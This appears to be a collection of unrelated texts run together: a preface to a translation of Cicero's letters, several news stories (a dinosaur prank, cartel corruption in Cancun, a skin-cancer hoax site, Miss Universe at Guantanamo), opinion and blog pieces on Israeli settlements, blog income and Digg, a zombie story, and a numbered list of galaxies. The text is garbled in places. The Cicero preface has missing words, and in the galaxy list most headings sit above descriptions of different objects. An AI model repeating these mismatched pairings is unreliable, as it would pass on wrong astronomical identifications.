PREFACE
The object of this book is to give the English - speaking public a convenient form , as faithful and readable a copy as the translator was capable of making of a document unique in the literature of antiquity .
Whether we regard the orrespondence of Cicero from the point of view of the biographer and observer of character , the historian , or the lover of belles lettres , it is equally worthy of study .
It seems needless to dwell on the immense historical importance of letters written by prominent actors in one of the decisive periods of the world 's history , when the great Republic , that had spread its victorious arms , and its law and discipline , over the greater part of the known world , was in the throes of its change from the old order to the new .
If we would understand — as who would not ?— the motives and aims of the men who acted in that great drama , there is nowhere that we can go with better hope of doing so than to these letters .
To the student of character also the personality of Cicero must always have a great fascination .
Statesman , orator , man of letters , father , husband , brother , and friend — in all these capacities he comes before us with singular vividness .
In every one of them he will doubtless rouse different feelings in different minds .
But though he will still , as he did in his lifetime , excite vehement disapproval as well as strong admiration , he will never , I think , appear to anyone dull or uninteresting .
In the greater part of his letters he is not posing or assuming a character ; he lets us only too frankly into his weaknesses and his vanities , as well as his generous admirations and warm affections .
Whether he is weeping , or angry , or exulting , or eager for compliments , or vain of his abilities and achievements , he is not a phantasm or a farceur , but a human being with fiercely - beating pulse and hot blood .
The difficulty of the task which I have been bold enough to undertake is well known to scholars , and may explain , though perhaps not excuse , the defects of my work .
One who undertakes to express the thoughts of antiquity in modern idiom goes to his task with his eyes open , and has no right at every stumbling - block or pitfall to bemoan his unhappy fate .
So also with the particular difficulties presented by the great founder of Latin style — his constant use of superlatives , his doubling and trebling of nearly synonymous terms , the endless shades of meaning in such common words as , and the like — all these the translator has to take in the day 's work .
Finally , there are the hard nuts to crack — often very hard — presented by corruption of the text .
Such problems , though , relatively with other ancient works , not perhaps excessively numerous , are yet sufficiently numerous and sufficiently difficult .
But besides these , which are the natural incidents of such work , there is the special difficulty that the letters are frequently answers to others which we do not possess , and which alone can fully explain the meaning of sentences which must remain enigmatical to us ; or they refer to matters by a word or phrase of almost telegraphic abruptness , with which the recipient was well acquainted , but as to which we are reduced to guessing .
When , however , all such insoluble difficulties are allowed for , which after all in absolute bulk are very small , there should ( if the present version is at all worthy ) be enough that is perfectly plain to everyone , and generally of the highest interest .
I had no intention of writing a commentary on the language of Cicero or his correspondents , and my translation must , as a rule , be taken for the only expression of my judgment formed after reading and weighing the arguments of commentators .
I meant only to add notes on persons and things enabling the reader to use the letters for biographical , social , and historical study .
I should have liked to dedicate it by the words .
But I found that the difficulties of the text compelled me to add a word here and there as to the solution of them which I preferred , or had myself to suggest .
Such notes are very rare , and rather meant as danger signals than critical discussions .
I have followed in the main the chronological arrangement of the letters adopted by Messrs .
Tyrrell and Purser , to whose great work my obligations are extremely numerous .
If , as is the case , I have not always been able to accept their conclusions , it is none the less true that their brilliant labours have infinitely lightened my task , and perhaps made it even possible .
I ought to mention that I have adopted the English mode of dating , writing , for instance , July and August , though Cicero repudiated the former and , of course , never heard of the latter .
I have also refrained generally from attempting to represent his Greek by French , partly because I fear I should have done it ill , and partly because it is not in him as in an English writer who lards his sentences with French .
It is almost confined to the letters to Atticus , to whom Greek was a second mother - tongue , and often , I think , is a quotation from him .
It does not really represent Cicero 's ordinary style .
Melmoth
One excuse for my boldness in venturing upon the work is the fact that no complete translation exists in English .
Mr. Jeans has published a brilliant translation of a selection of some of the best of the letters .
But still it is not the whole .
The last century versions ofand Herbenden have many excellences ; but they are not complete either ( the letters to Brutus , for instance , having been discovered since ) , and need , at any rate , a somewhat searching revision .
Besides , with many graces of style , they may perhaps prove less attractive now than they did a century ago .
At any rate it is done , and I must bear with what equanimity nature has given me the strictures of critics , who doubtless will find , if so minded , many blemishes to set off against , and perhaps outweigh , any merit my translation may have .
I must bear that as well as I may .
But no critic can take from me the days and nights spent in close communion with 's greatest intellect , or the endless pleasure of solving the perpetually recurring problem of how best to transfer a great writer 's thoughts and feelings from one language to another : “
Jurassic lark : Students caught stealing giant model dinosaur from museum in drunken prank
This is the moment a group of students tried to abduct a giant model dinosaur from a museum as a drunken prank .
The young men had been out celebrating the end of their course when they walked past the life - size monster .
Deciding to relocate it in the middle of a roundabout as a joke , they set about lifting the 20ft long and 10ft tall plastic triceratops .
D'you think they ' saur - us ?
The students lifted the huge plastic triceratops over the iron gate outside the Dinosaur Museum in Dorchester
It took ten of them carry the giant model over an iron gate outside the Dinosaur Museum in Dorchester , Dorset .
But just as they carried it off above their heads into the night , they were stopped in their tracks by a policeman .
The revellers were ordered to take the dinosaur back immediately otherwise they would have been arrested for theft and criminal damage .
Student Steve
Fry said : ' One of the guys on the course said he had always wanted to take the dinosaur for a laugh and wanted to know if we were all up for it .
' The police caught 14 of us in the High Street at about 2.30 am - we 'd managed to get it half way up there .
' The police asked us to take it back which we did quite willingly and I have to admit they found it quite funny . '
He added : ' We were really sorry for causing any hassle and we are in the process of paying for the slight damages that the triceratops sustained whilst we lifted it over the fence . '
Mammoth task :
It took ten of them to carry the model out into the night before they were stopped by a policeman
Inspector Les Fry , of Dorchester Police , said he had never heard of anyone trying to take the dinosaur before .
He said : ' The young people involved have apologised to the manager of the museum both verbally and in writing .
' This was an ill - advised prank and I would advise against such an action . '
The students all studied at Kingston Maurward College , a further education college specialising in agricultural studies .
A spokesman for the college said : ' We do understand that some of our students were involved in the taking of the dinosaur .
' Naturally as a college we do n't support this kind of behaviour and we have spoken to those involved . '
The Dinosaur Museum in Dorchester is packed full of life - sized reconstructions of dinosaurs , alongside skeletons and fossils .
Manager Tim Batty declined to comment on the situation until it has been investigated by police .
The museum 's website says the models ' beg to be touched by little hands - and that is encouraged , as is the handling of some of the dinosaur fossils . '

From the earliest days of the peace process , it was clear that Israel 's settlements would be one of the most contentious issues on the Israeli - Palestinian and Israeli domestic agendas .
Conventional wisdom has held that serious Israeli action on settlements must be put off until a deal is ready to be signed .
This is based on the logic that given the huge amount of political capital it will cost any Israeli government either to freeze settlements or to pursue peace , no Israeli government can do both at the same time .
This logic has been advanced in Israel and in Washington since the time of Yitzhak Rabin , and has been largely accepted by every U.S. government since George H.W. Bush .
But such logic is a dangerous trap .
Far from smoothing the path to peace , these settlements ' continued expansion directly undermines any chance of reaching a peace agreement .
We say this with conviction born of experience from 15 years of peace efforts .
Why ?
Because it emboldens settlers and their advocates , who are more than happy to play the various political parties off each other , creating an incentive for Israeli governments to indulge their demands .
Why ?
Because settlement expansion further complicates the situation on the ground , making it even more difficult to eventually " unscramble the egg " and establish a viable Palestinian state living side - by - side with Israel .
Why ?
Because every new house , plan , and approval deals a body blow to the credibility of peace efforts and undermines pro-peace Palestinian leaders ; Palestinians interpret these moves as indications that Israel is not serious about peace .
If the Obama administration 's Middle East peace efforts are to be credible , let alone successful , President Obama and his officials must not fall into this same trap .
They must recognize that a comprehensive settlement freeze needs to be the starting point , not the ending point , of its peace efforts .
This means no longer accepting rationalizations and procrastination tactics on the issue .
It means refusing to get pulled into endless , artificial debates about what " expanding a settlement " actually means - debates whose clear purpose is to delay , water down , or scuttle any settlement freeze .
It means not buying arguments about settlements needing to expand to accommodate " natural growth , " bearing in mind that growth in settlements is not " natural " in any way , but is the result of government policies designed to attract Israelis to settlements and keep them there .
It means rejecting efforts to create special categories of settlements that Israel wants to continue to expand - like those in the ever - expanding , unofficial " settlement blocs . "
It means adopting a policy that is predicated on the clear recognition that any settlement expansion directly threatens the prospects for ever achieving a negotiated Israeli - Palestinian agreement - including an agreement under which Israel could receive recognized , permanent claim to some of the settlements it holds most dear .
It means laying down a clear red line : no settlement expansion of any kind , period .
It means no new settlement construction or planning , a freeze on construction and plans that are in the pipeline , a freeze on projects that are already proceeding ( and compensation , as necessary , for investors and developers ) , and the cancellation of policies that encourage Israelis to move to settlements .
The government of Israel has the power to enforce such a freeze .
Israeli planning and construction in the West Bank - an area that Israel has never annexed - are not treated as merely technical or bureaucratic matters under Israeli law .
Rather , the government of Israel recognizes that such activities have special political , security and diplomatic significance .
As a result , all settlement planning and construction require the direct approval of the political echelons of the Israeli government - primarily the Minister of Defense and sometimes the entire cabinet .
The government of Israel has the power to freeze settlements completely .
Whether it does so is strictly a question of political will , not legal authority .
In 1993 , at the outset of the peace process , then - Prime Minister Yitzhak Rabin asserted that Israel must " continue the peace process as If there is no terror , and fight terror as if there is no peace process . "
He was certainly right in this view .
However , the similar view on settlements - the view that says that Israel can " negotiate peace as if there is no settlement expansion and expand settlements as if there are no peace negotiations " - is dangerously wrong .
It is a dangerous trap that President Obama must avoid . .

I was a little surprised this morning when , after I ’d given a talk on business blogging , a seminar attendee asked if I ’d seen the Newsweek article this week on why it ’s impossible to make money with blogs .
“ Guess I ’ll give it all back , then , ” was my off - the - cuff answer .
But out of curiosity , I picked the mag up on the way back to my room .
If you have n’t seen it , Daniel Lyons , a talented blogger known for two years as “ Fake Steve Jobs , ” has an editorial that explains why none of us can make money blogging .
Big traffic , no money
Fake Steve Jobs ’ best month came with a traffic spike .
His actual identity was revealed in the New York Times , sending more than a half - million people to his site in a single day .
His payout ?
For that half - million - visitor day , about a hundred dollars in AdSense earnings .
For the entire month , he made $ 1,039.81 .
Not quite what he was hoping for when he became a celebrity blogger and earned an impressive amount of attention and notoriety .
So if Fake Steve Jobs can’t monetize a blog , the rest of us are doomed , right ?
He worked hard , he created quality content , he had a terrific angle that went nicely viral .
He was at the pinnacle , and he ’s broke .
So we will be too .
It must be true , he said it in Newsweek .
I learned the hard way : while blogs can do many wonderful things , making huge amounts of money is n’t one of them .
The expert weighs in
The article then tapped another source for a little expert credibility , Paul Verna , an analyst with eMarketer .
Verna ’s take was that the real issue was “ the lack of a clear business model that can generate substantial revenues . ”
Verna ’s on the right track , but we ’re still a long way from the core problem .
If your business model is “ I want to make money on the Internet , ” you ’re not going to get very far .
The Internet is profoundly indifferent to your desire to make money with it .
Please notice that this does not mean that “ there is no possible viable business model for any blog , other than a few fortunate exceptions that prove the rule , ” which was the conclusion Lyons reached .
It just means that Fake Steve Jobs did n’t come up with a working business model , so he did n’t make any money .
Blogs are not television
I ’ll confess , I have no idea how to monetize Fake Steve Jobs .
His readers are n’t coming to his site to solve any kind of real - world problem , other than “ how can I kill 10 minutes before my boss gets back from lunch ? ”
Television networks produce entertainment .
They either make money from advertising or , for premium cable channels , from subscriptions .
If you want to watch Lost , you have to watch ads .
Tivo dented that model considerably , but it still works well enough for now .
Advertising can work on some content web sites , but it usually works best when the reader is coming to the site to figure out a solution to a problem .
If an ad presents a relevant solution to that problem , the ad can be effective .
For a complex bunch of reasons , advertising is n’t especially effective on most blogs .
Unless there ’s a terrific message - to - market match , ads on blogs tend to underperform wildly .
If you want to make money in the real world , solve real problems
Too bad Lyons was n’t a Copyblogger reader .
He might have seen Brian ’s post about the smartest monetization strategies for blogs and content sites , and why advertising is no longer on that list .
It ’s not about trends in advertising or trends in the blogosphere .
It ’s about returning to a fundamental marketing truth .
If you do n’t offer customers something they dearly want , whether it ’s to gain some great pleasure or escape some great pain , you ’re not going to make any money .
People do want entertainment and relief from boredom , but selling pure entertainment online is tricky .
Right now the expectation on the web is that entertainment is free .
You ’ll have to get creative to escape that context , the same way musicians had to get creative to make a living when free music sharing became the norm .
It ’s time for online business to grow up
For a long time , we believed that “ online was different , ” and that we did n’t need to accept any of the normal rules of business .
We ’d put something on the web and Magic Internet Dust would come along and make up for our total absence of business knowledge .
“ Leap , and the net will appear , ” was the mantra .
That sort of worked for awhile , but it does n’t work now .
If you do n’t have a solid understanding of who your market is , how they ’ll find you , and what problems you solve for them , it ’s now “ Leap , and the floor will appear . ”
So focus on what does work now , and has always worked .
Provide value .
Solve actual problems .
Uncover what ’s bugging people and fix it for them .
The real Steve Jobs sells beautiful , easy - to - use , loveable tools that make his customers ’ lives better .
If Fake Steve Jobs wanted to make money , he would have had to do some work to figure out how he could do the same .

“ OK boys get down ! ”
The heavily bearded man yelled out as he ran back toward the trench , away from the heavily fortified building and trailing two detonation cords behind him .
—
Three days ago they had met him while scavenging through the now deserted mall .
While they had been looking for food , he had been on a mission to collect very specific items .
At first he was reluctant to tell them what he was after , but eventually they coaxed it out of him .
He needed bomb making equipment .
He already had enough fertilizer to take out a city block , he just needed some detonation cords , some flare guns and a few simple electronics .
Dave and Mike agreed to help in exchange for food , it was either that or continue to dodge zombies and eat rats , and they were both sick of rats .
Over the next day they loaded the equipment onto a cart , carefully following his instructions , ever weary of accidentally detonating the device .
In the evening they dined on canned beans , made ‘ oh so sweet ’ compared to the garbage they had eaten over the last three months .
On the third day , as the sun began to wane , they wheeled the cart from his abode and set off for the tall building .
As they approached , they could see that was once a large office building had been heavily fortified , inside and out , with the occasional dark shape moving across the barricaded windows .
“ Alright boys , there ’s a ditch about 300 yards over there ” Pointing toward some burnt out cars “ You get your heads down , I ’m going to set this stuff up and I ’ll be with you shortly ” .
—
As the man slid into the trench he grinned and pushed the first firing cord into the detonator “ Lets watch the pre-game show boys ! ” and twisted the detonator .
With a roar the thirty flare guns they had assembled , fired , sending a multitude of colors into the night sky .
“ What the hell are you doing ! ” shouted Dave “ You ’re going to attract every zombie for fifty miles ! ”
“ That ’s right boy , and when they get here I ’ve got a special present for them ”
Mike , wide eyed with fear could see shapes rushing around behind the dark barricaded windows .
“ The bomb ?
You ’re going to try and blow them all up ? ”
“ God no boy , I ’m going to blow the door off of that building ! ”
“ What ?
Why ?
What ’s in there ? ”
In the distance they could hear the moans as a thousand zombies headed toward the now falling flares .
The old man smiled , the flare light illuminating a dark glint in his eyes .
“ Telemarketers boys , that buildings full of Telemarketers ”

The suspect cruised around in an SUV that had been reported stolen .
He toted corrido music glorifying drug smugglers and hit men , and allegedly helped them operate in this beach resort .
And until a few weeks ago , he was Cancun ’s police chief .
Now Francisco Velasco is in custody in Mexico City while federal authorities investigate whether he took part in the killing last month of a retired army general who had been hired to revamp the city ’s police force .
The 57 - year - old Velasco , who was in his fourth stint as Cancun ’s police chief , has not been charged .
But federal officials say they believe he protected seven people accused of kidnapping and killing Gen. Mauro Enrique Tello and two others .
The trio disappeared in downtown Cancun late on Feb .
2 . Their bodies , riddled with bullets , were found the next morning beside a highway , 15 miles away .
The general ’s arms and legs had been broken , apparently as a result of torture .
Authorities believe the slaying was the work of the Zetas , much - feared enforcers for drug - smuggling gangs .
The murky case has hit Cancun like one of the tropical storms that lumber in off the Caribbean , setting off charges that a police force touted as one of the most trustworthy in the nation is rife with corruption .
A high - profile killing in the country ’s signature beach resort is the last thing Mexico needs at a time when drug - related violence has scared away visitors from areas such as Baja California .
More than 6,000 people were slain last year , predominantly in areas near the U.S. border , while President Felipe Calderon has struggled to root out corruption in law enforcement at every level .
“ The reality is that Cancun , like the rest of Mexico , is at war , ” said Cesar Muñoz , an editor at Novedades , a daily newspaper in Cancun that has closely followed the Tello case .
“ It ’s at war with the drug cartels . ”
The slayings are raising uncomfortable questions about how deeply corruption has infected the city ’s government .
The director of the Cancun jail and head of the city ’s traffic division also have been detained , according to news reports .
There is no sign , however , that Mayor Gregorio Sanchez , a self - styled reformer elected last year , is under investigation .
“ There is corruption , ” Cancun ’s new police chief , Maria Esther Estiubarte , the first woman to hold the post , conceded in an interview a few days after taking the job .
But she said it was limited .
“ It does n’t put the tourist destination at risk , ” Estiubarte said .
The incident does not seem to have spooked spring break vacationers , who already are pouring into the palm - lined beach region .
The killings took place miles from the sprawling resorts and high - rises , where security is strict and crime against tourists is rare .
The surrounding state of Quintana Roo remains relatively tranquil compared with other states where drug violence has exploded .
The state registered about 20 homicides last year .
But although roadside billboards welcome visitors to “ paradise , ” Cancun has long had an unsavory side that looks nothing like the brochure pictures of sugary beaches and deep - blue waters .
The area is a well - established transshipment point for cocaine smuggled by air from South America or overland through Central America on its way to the U.S.
A former Quintana Roo governor , Mario Villanueva Madrid , awaits extradition to the United States on charges that he took payoffs in exchange for helping Mexican traffickers move tons of cocaine through his state .
In August , a pile of 11 decapitated bodies turned up in the neighboring state of Yucatan , in what was believed to be an organized - crime hit .
A 12th headless body was found the same day in a separate spot .
The killings were attributed to the Zetas .
Many residents worry that the killings augur a menacing new phase for Cancun .
Apart from the main tourist zone , drug sales flourish on the streets of the shabbiest barrios , where prostitutes beckon from the shadows and fear of gang members keeps residents from venturing out more than a few blocks at night .
A stream of job seekers from Mexico ’s impoverished south means business for flophouses that charge as little as $ 50 a month , but it has strained the city ’s resources .
Along rutted streets on the edge of town , squatter families inhabit stick shacks that are lighted by electricity stolen from nearby utility lines .
The fast growth has turned this other Cancun into a traffic - clogged city of about 750,000 -- big enough , some say , to serve as cover for the drug syndicates that operate elsewhere in Mexico .
“ This is the moment .
Cancun has grown a lot and now looks like a good cave , a good hiding place , for these activities , ” said Father Rafael Ruiz , a parish priest in a graffiti- spattered part of what he calls the “ Mexican Cancun . ”
Around town , mystery cloaks the case of the slain general .
Tello’s body , along with those of army Lt. Getulio Cesar Roman Zuñiga and Juan Ramirez Sanchez , who was the mayor ’s nephew , were found in a pickup next to the road to colonial Merida , which sits across the Yucatan peninsula about 175 miles from Cancun .
They were seized apparently in downtown Cancun hours after Mayor Sanchez introduced Tello to other municipal staffers as his new security advisor , with the task of creating a separate elite police squad .
Former top infantry commander of the Mexican army , Tello had completed a command tour in the western state of Michoacan as part of Calderon ’s military - led offensive against drug traffickers .
He had arrived in Cancun in late January .
Sanchez had asked Tello , known as a well - trained and tough commander , to organize a SWAT - type team of 100 former soldiers that would answer only to the mayor ; essentially a parallel force above the reach of then - Police Chief Velasco .
The mayor said he wanted a new force that would remain “ outside the contamination ” of the 2,000 - officer police department .
“ We do n’t want to put all our eggs in the same basket , ” he said in an interview .
Sanchez said he did not suspect Velasco of wrongdoing , but believed that there were dirty cops on the force , despite months of culling .
A popular businessman who ran as candidate of a leftist coalition , Sanchez has cultivated the image of a reformer in less than a year in office .
He announced a “ zero tolerance ” policy on corruption and has fired 150 suspect cops .
In December , Sanchez said , the federal government named Cancun ’s force the third - most trustworthy in the country .
Skeptics point out that it was Sanchez who hired Velasco , a balding , old - school cop with a push - broom mustache and the nickname “ Viking . ”
The mayor also continued to back his pick after investigators in the Tello case began to focus on the chief .
If Velasco was up to no good , residents ask privately , how is it possible the mayor did n’t know ?
On Feb. 11 , a week after the killing , federal authorities said they had arrested seven members of an alleged Zetas cell in Cancun .
They included a former soldier and an active - duty Cancun police officer .
Federal prosecutors said they had received testimony that Velasco offered “ protection and aid ” to the cell and had been seen meeting with its leaders .
Velasco is under a 40 - day detention during the investigation .
After Velasco was hauled off to Mexico City for questioning , Quintana Roo prosecutors said a vehicle check on his Nissan Armada , painted with police logos , indicated that it had been reported stolen in Mexico City in 2006 .
Inside were CDs with narcocorridos about the Zetas .
Songs included “ Z Dynasty , ” “ Pact of Honor ” and “ Eagles Go Alone . ”
The motive for the killing is unclear .
One theory is that Tello was set up by drug traffickers he battled in Michoacan .
Another holds that the Zetas saw him as a threat to operations in Cancun .
Mayor Sanchez said he was committed to creating his SWAT force once he found someone to run it .
But the general ’s killing has left many in Cancun uneasy about the dark forces working in their midst .
“ There is a lot of fear , ” said Ruiz , the parish priest .
“ We know that these people , who have little sense of morality or justice , are among the people . ”

A hoax website that tells users they can develop an all - year tan by staring at their computer screen has received more than one million hits in the last two months .
Computertan.com , which describes itself as a safe and easy " revolutionary new online tanning service " , encourages users to download a free trial in which they are given a mock skin - analysis and see tubes from a sun-bed flash up on screen .
At the end of the trial a message says , " Do n't be fooled , UV exposure can kill " , followed by a series of images that show the effects of sun damage .
The site has been set up by Skcin , a charity based in Nottingham in memory of Karen Clifford , a local resident who died from skin cancer in 2005 .
A spokesperson from Skcin said : " This is an astonishing response and has undoubtedly helped raise awareness of the dangers of skin cancer . "
1 The Sombrero Galaxy
2 Black Eye Galaxy
The Sombrero Galaxy ( also known as M104 or NGC 4594 ) is an unbarred spiral galaxy in the constellation Virgo .
It has a bright nucleus , an unusually large central bulge , and a prominent dust lane in its inclined disk .
The dark dust lane and the bulge give this galaxy the appearance of a sombrero .
The galaxy has an apparent magnitude of +9.0 , making it easily visible with amateur telescopes .
The large bulge , the central supermassive black hole , and the dust lane all attract the attention of professional astronomers .
3 2MASX J00482185-2507365 occulting pair
A spiral galaxy in the Coma Berenices constellation , Messier 64 , the famous “ Black Eye ” galaxy or the “ Sleeping Beauty galaxy , ” has a spectacular dark band of absorbing dust in front of the galaxy ’s bright nucleus .
It is well known among amateur astronomers because of its appearance in small telescopes .
4 The Whirlpool Galaxy
The 2MASX J00482185-2507365 occulting pair is a pair of overlapping spiral galaxies found in the vicinity of NGC 253 , the Sculptor Galaxy .
Both galaxies are more distant than NGC 253 , with the background galaxy , 2MASX J00482185-2507365 , lying at redshift z=0.06 , and the foreground galaxy lying between NGC 253 and the background galaxy ( 0.0008 < z < 0.06 ) .
This pair of galaxies illuminates the distribution of galactic dust beyond the visible arms of a spiral galaxy .
The heretofore unexpected extent of dust beyond the starry limits of the arms , shows new areas for extragalactic astronomical study .
The dusty arms extend 6 times the radii of the starry arms of the galaxy , and is shown silhouetted in HST images against the central and core sections of the background galaxy .
5 Grand spiral galaxy
Also known as Messier 51a , M51a , or NGC 5194 , the Whirlpool Galaxy is an interacting grand - design spiral galaxy located at a distance of approximately 23 million light - years in the constellation Canes Venatici .
It is one of the most famous spiral galaxies in the sky .
The galaxy and its companion ( NGC 5195 ) are easily observed by amateur astronomers , and the two galaxies may even be seen with binoculars .
The Whirlpool Galaxy is also a popular target for professional astronomers , who study it to further understanding of galaxy structure ( particularly structure associated with the spiral arms ) and galaxy interactions .
6 Supernova 1987A
Also known as NGC 123 , this fascinating galaxy is dominated by millions of bright stars and dark dust , caught up in a gravitational swirl of spiral arms rotating about the center .
Open clusters containing bright blue stars can be seen sprinkled along these spiral arms , while dark lanes of dense interstellar dust can be seen sprinkled between them .
Less visible , but detectable , are billions of dim normal stars and vast tracts of interstellar gas , together wielding such high mass that they dominate the dynamics of the inner galaxy .
Invisible are even greater amounts of matter in a form we do n’t yet know – pervasive dark matter needed to explain the motions of the visible in the outer galaxy .
7 Galaxy NGC 1512
Two decades ago , astronomers spotted one of the brightest exploding stars in more than 400 years : a doomed star , called Supernova 1987A .
This image shows the entire region around the supernova .
The most prominent feature in the image is a ring with dozens of bright spots .
A shock wave of material unleashed by the stellar blast is slamming into regions along the ring ’s inner regions , heating them up , and causing them to glow .
The ring , about a light - year across , was probably shed by the star about 20,000 years before it exploded .
In the next few years , the entire ring will be ablaze as it absorbs the full force of the crash .
The glowing ring is expected to become bright enough to illuminate the star ’s surroundings , providing astronomers with new information on how the star expelled material before the explosion .
The image was taken in December 2006 with Hubble ’s Advanced Camera for Surveys .

8 Galaxy NGC 3370
A barred spiral galaxy located some 30 million light years away toward the constellation Horologium , Galaxy NGC 1512 is bright enough to be seen with amateur telescopes .
The galaxy is some 70,000 light years across , which is nearly as large as our own Milky Way galaxy .
The core of the galaxy is remarkable for its “ circumnuclear ” starburst ring , which is an amazing circle of young star clusters that spans some 2400 light years across .
Galaxy “ starbursts ” are episodes of vigorous formation of new stars and are found in various galaxy environments .
9 M81
A dusty spiral galaxy located some 98 million light years away toward the constellation Leo , the center of NGC 3370 shows well delineated dust lanes and an uncommonly ill - defined nucleus .

10 Hoag ’s Object
The big and beautiful spiral galaxy M81 , in the northern constellation Ursa Major , is one of the brightest galaxies visible in the skies of planet Earth .
This superbly detailed view reveals its bright nucleus , grand spiral arms and sweeping cosmic dust lanes with a scale comparable to the Milky Way .
Hinting at a disorderly past , a remarkable dust lane runs straight through the disk , below and right of the galactic center , contrary to M81 ’s other prominent spiral features .
The errant dust lane may be the lingering result of a close encounter between M81 and its smaller companion galaxy , M82 .
Scrutiny of variable stars in M81 ( aka NGC 3031 ) has yielded one of the best determined distances for an external galaxy — 11.8 million light - years .

A non-typical galaxy of the type known as a ring galaxy , the appearance of Hoag ’s Object has interested amateur astronomers as much as its uncommon structure has fascinated professionals .
Is this one galaxy or two ?
This question came to light in 1950 when astronomer Art Hoag chanced upon this unusual extragalactic object .
On the outside is a ring dominated by bright blue stars , while near the center lies a ball of much redder stars that are likely much older .
Between the two is a gap that appears almost completely dark .
How Hoag ’s Object formed remains unknown , although similar objects have now been identified and collectively labeled as a form of ring galaxy .
Genesis hypotheses include a galaxy collision billions of years ago and perturbative gravitational interactions involving an unusually shaped core .
The above photo taken by the Hubble Space Telescope in July 2001 reveals unprecedented details of Hoag ’s Object and may yield a better understanding .
Hoag ’s Object spans about 100,000 light years and lies about 600 million light years away toward the constellation of Serpens .
Coincidentally , visible in the gap is yet another ring galaxy that likely lies far in the distance .

By now you have probably read the countless articles about how flawed the contextual advertising system is on Digg .
The system at Digg is certainly flawed , but not just in terms of contextual advertising .
And one site - StumbleUpon - it seems , plans to capitalize on those flaws ( and very well might be successful in doing so ) .
If you 're a successful online publisher , service provider or Internet marketer then you 're probably well aware of the advantages of using ( not exploiting ) social news sites .
If your site or service falls in a niche that matches nicely with the vertical ( and demographics ) of a particular popular social news site then you stand to gain hundreds of thousands of visitors by creating content for the audience of that particular site .
The problem , of course , is as people realize the importance ( or viability ) of social news sites as marketing platforms , many of these people try to exploit them with poor content and then pushing it via brute force promotion , buying votes , using multiple accounts , and other terms of service and use violations .
To prevent such people from ' gaming ' the system by inflating votes , the social news sites increase the sophistication of their promotion algorithms by making the ' gaming detection ' more robust and demanding a higher degree of diversity in votes on a story before it can be promoted and get the traffic ( which at that point the algorithm deems deserved ) .
It seems , however , that this increased sophistication does n't always work as planned and often penalizes certain users and sites more than it should , and in many cases overzealous moderators ( on social news sites ) end up banning users and sites for spamming activity or other terms of use violations .
Because of this , these social news sites incur the ire of many users in the social news community , independent publishers , as well as marketers , and often rightfully so .
A different approach
Ultimately , these sites have established terms of use and service and they are well within their rights to make the decisions , however detrimental they may be to the community and the long - term profitability of the sites .
On one end we have Digg , that has long raged a war against marketers and often the very people that helped build the community and is quite often criticized for it very vocally .
At the same time , the site that was once a beacon of hope for the independent publishers , now seems resolutely aligned with the mainstream .
But on the other end , we have StumbleUpon which has decided on a markedly different approach to solving its problems .
StumbleUpon bans users that are seen to artificially inflate votes on content because of the terms of use violation , but then offers a viable alternative to those who want to legitimately use the service to cash in .
A look at revenue
StumbleUpon 's 2008 expected revenues are approximated at $ 5 - 7.5 million .
At the same time , Businessweek estimates that in the first three quarters of 2008 , Digg lost $ 4 million on $ 6.4 million in revenue .
While I do n't know the costs to run StumbleUpon , it 's fair to assume that they are far less than running Digg , not only because StumbleUpon is substantially smaller in terms of users and monthly traffic , but also because the service does n't require the same number of servers or have to deal with the bandwidth costs that destination sites like Digg do .
So how does StumbleUpon manage to make comparable revenues to Digg with far less traffic ( as a destination ) and a substantially lower number of users , while not alienating marketers and publishers ?
It 's quite simple actually , and considering that it's no secret and nothing new , it 's surprising that no other social news site has been able to do something similar .
StumbleUpon uses a two tiered approach to making money while keeping the community , the marketers , and the publishers happy .
1. Sponsored Users - while a free , basic StumbleUpon account has everything that most users will ever need , the service allows you to upgrade to a sponsored account for a modest fee .
2 . Sponsored Stumbles - to resolve issues with marketers and publishers , StumbleUpon allows them to buy traffic from the service .
Before you start thinking that paid traffic pollutes the integrity of a trust - based social news site , consider their justification : the whole purpose of the site is to determine the preferences of a user based on his or her habits ( thumbs up or down ) on the site and then continue to send the user targeted sites .
If the service performs its functions well , then it should n't matter if the content is sponsored or not , because in either case the content is relevant to your interests based on StumbleUpon 's recommendation engine .
Rather than outright banning users for violating the terms of service , StumbleUpon sends them the following email while putting their accounts under review .
Our Terms of Service prohibits members from creating multiple accounts without permission or using a StumbleUpon membership to promote a specific site , business or product .

Why has n't Digg been able to monetize ?
Going back to the original point for a moment , the reason why Digg has n't been able to monetize the site is partially because over half the users do n't actually view the ads ( on Digg or the sites they click out to ) and the ones that are able to see ads are n't clicking on them because the ads just are n't relevant to them , but just as important , it 's because they have n't been able to leverage the audience with the publishers the way StumbleUpon has managed to .
In fact , Digg does n't even seem to have a plan in place to do so .
According to statement from Jay Adelson from last month , here 's the monetization plan for Digg :
The company recently started to sell ads on its RSS feeds .
It is on the verge of launching a revamped version of its homegrown search engine that the company hopes will produce more relevant and profitable search advertisements .
And it is within a month of closing a deal with a mobile ad provider to sell more ads on cell phones .
The answer is pretty straightforward , Facebook figured it out with Beacon ( though they butchered the implementation ) and StumbleUpon figured it out a long time ago .
Leverage the demographic goldmine you have to understand your target audience , then use your collaborative filtering and recommendation engines to nail down the exact preferences of your patrons , and finally give them what they want , but charge the people whose content you 're delivering .
Targeted traffic ( and audience / community building ) does n't get better than that .
Also noteworthy , StumbleUpon , which has recently unveiled a new design , has upped its efforts to increase revenue , and in a surprising but very intelligent move , has started to market its paid traffic service to the Digg audience .
Keep in mind , eBay has done virtually nothing with StumbleUpon so far but has plenty of options to explore .
Perhaps
Om is right , maybe Digg should buy StumbleUpon ( or the other way around considering the underdog is profitable ) .

Miss Universe 2008 , Dayana Mendoza , says the camp was " soooo beautiful " Life may be tough for its full - time residents , but for Miss Universe a day out at the US prison camp at Guantanamo Bay was simply " a loooot of fun ! "
Venezuelan beauty queen Dayana Mendoza visited the centre and wrote about it on the Miss Universe blog on 27 March .
Her remarks that she " did n't want to leave " the " calm and beautiful " place attracted some scathing reactions .
Her blog entry has now been removed , while a statement has been uploaded explaining the motives of her trip .
Former detainees and human rights groups have alleged that torture - including " waterboarding " ( simulated drowning ) - took place at the camp .
Used to hold captives deemed " enemy combatants " in former President George W Bush 's " war on terror " , it became one of the most contentious symbols of his administration .
President Barack Obama has ordered the closure of the camp , which now holds around 240 inmates , by early next year .
' Incredible experience '
Ms Mendoza visited the camp along with Miss USA , Crystal Stewart , for several days and recounted her experiences in her blog .
The camp has been criticised as a torture centre
It was an " incredible experience " she said .
" We hung out with the guys from the East Coast and they showed us the boat inside and out , how they work and what they do , we took a ride around the land and it was a loooot of fun !
" We also met the Military dogs , and they did a very nice demonstration of their skills .
All the guys from the Army were amazing with us .
